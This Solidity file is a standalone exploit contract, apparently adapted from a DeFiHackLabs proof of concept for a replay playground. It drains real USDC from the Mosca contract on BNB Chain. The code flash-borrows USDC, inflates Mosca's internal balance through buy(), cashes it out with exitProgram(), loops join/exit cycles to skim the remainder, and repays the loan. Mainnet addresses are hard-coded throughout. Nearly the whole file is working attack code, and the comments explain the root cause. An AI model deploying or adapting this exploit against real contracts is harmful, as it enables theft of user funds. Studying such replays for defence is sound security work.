// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2025-01-Mosca).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker = address(this); the PancakeV3 flash callback `pancakeV3FlashCallback`
// lives on the test contract itself), so there is no standalone contract to
// deploy. This contract is a faithful, self-contained copy of that inline attack
// (test/Mosca_exp.sol: Mosca.testExploit / pancakeV3FlashCallback), so the
// playground can deploy it and record run(). Logic and constants are copied
// verbatim, with one adaptation: the original test funds itself with 30 USDC via
// `deal(USDC, address(this), 30 ether)` in setUp() before the attack. Since the
// playground records a single call, that pre-funding is expressed as the config's
// `setup.dealToken` (30 USDC → the exploit contract), unrecorded, before run().
//
// Root cause: Mosca credits INTERNAL accounting balances on join()/buy() that far
// exceed the real stablecoin actually paid in, then exitProgram() → withdrawAll()
// refunds the FULL internal balance (balance + balanceUSDT + balanceUSDC) in real
// USDC. buy(amount, true, 2) credits balanceUSDC += amount*1000/1015 for ANY amount
// the caller can momentarily transfer in — so a flash-loaned 1,000 USDC inflates
// balanceUSDC by ~985 USDC, and the immediately-following exitProgram() pays that
// out of the contract's genuine USDC reserves. Twenty extra join()/exitProgram()
// cycles skim the residual internal balance each 30-USDC join credits.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IMosca {
    function join(uint256 amount, uint256 _refCode, uint8 fiat, bool enterpriseJoin) external;
    function buy(uint256 amount, bool buyFiat, uint8 fiat) external;
    function exitProgram() external;
}

interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract MoscaDrain {
    address private constant USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
    address private constant MOSCA = 0x1962b3356122d6A56f978e112d14f5E23a25037D;
    address private constant PancakePool = 0x92b7807bF19b7DDdf89b706143896d05228f3121;

    // Recorded attack: seed a membership with 30 USDC via join(), then flash-borrow
    // 1,000 USDC from the PancakeV3 pool. Everything of substance happens in the
    // flash callback below.
    function run() external {
        IERC20(USDC).approve(MOSCA, type(uint256).max);

        uint256 amount = 30_000_000_000_000_000_000; // 30 USDC
        uint256 refCode = 0;
        uint8 fiat = 2; // USDC
        bool enterpriseJoin = false;
        IMosca(MOSCA).join(amount, refCode, fiat, enterpriseJoin);

        address recipient = address(this);
        uint256 amount0 = 0;
        uint256 amount1 = 1_000_000_000_000_000_000_000; // flash-borrow 1,000 USDC (token1)
        bytes memory data = abi.encode(amount1);
        IPancakeV3Pool(PancakePool).flash(recipient, amount0, amount1, data);
    }

    // PancakeV3 flash callback (token1 = USDC; fee1 is the flash premium).
    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes memory data) external {
        uint256 amount = abi.decode(data, (uint256));

        // buy() credits balanceUSDC += amount*1000/1015 for the full flash-loaned
        // amount, then exitProgram() refunds that inflated internal balance in real
        // USDC out of the contract's reserves.
        IMosca(MOSCA).buy(amount, true, 2);
        IMosca(MOSCA).exitProgram();

        uint256 joinAmount = 30_000_000_000_000_000_000; // 30 USDC

        // Twenty more join()/exitProgram() cycles skim the residual internal balance
        // each 30-USDC join credits (baseAmount - JOIN_FEE) but refunds in full.
        for (uint256 i = 0; i < 20; i++) {
            IMosca(MOSCA).join(joinAmount, 0, 2, false);
            IMosca(MOSCA).exitProgram();
        }

        // Repay the flash loan (borrowed amount + fee1) to the pool.
        IERC20(USDC).transfer(msg.sender, amount + fee1);
    }
}
